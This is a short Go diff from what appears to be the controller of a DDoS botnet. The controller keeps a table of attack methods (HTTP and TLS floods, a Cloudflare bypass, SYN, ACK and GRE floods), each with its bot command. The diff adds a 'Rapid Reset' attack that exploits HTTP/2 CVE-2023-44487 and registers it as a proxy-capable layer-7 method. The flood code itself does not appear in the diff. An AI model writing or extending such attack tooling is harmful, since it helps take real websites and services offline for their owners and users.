@@ -148,6 +148,7 @@ var attackMethods = []struct {
 	{"HTTP GET", "Layer 7 GET request flood", "!http"},
 	{"HTTPS/TLS", "Layer 7 encrypted flood", "!https"},
 	{"CF Bypass", "Cloudflare UAM bypass", "!cfbypass"},
+	{"Rapid Reset", "HTTP/2 CVE-2023-44487", "!rapidreset"},
 	{"SYN Flood", "Raw SYN packet flood", "!syn"},
 	{"ACK Flood", "ACK packet flood", "!ack"},
 	{"GRE Flood", "GRE tunnel flood", "!gre"},
@@ -156,7 +157,7 @@ var attackMethods = []struct {
 
 // isL7Method checks if the attack method supports proxies
 func isL7Method(cmd string) bool {
-	return cmd == "!http" || cmd == "!https" || cmd == "!tls" || cmd == "!cfbypass"
+	return cmd == "!http" || cmd == "!https" || cmd == "!tls" || cmd == "!cfbypass" || cmd == "!rapidreset"
 }
 
 // TUIAttack tracks attacks launched from TUI mode
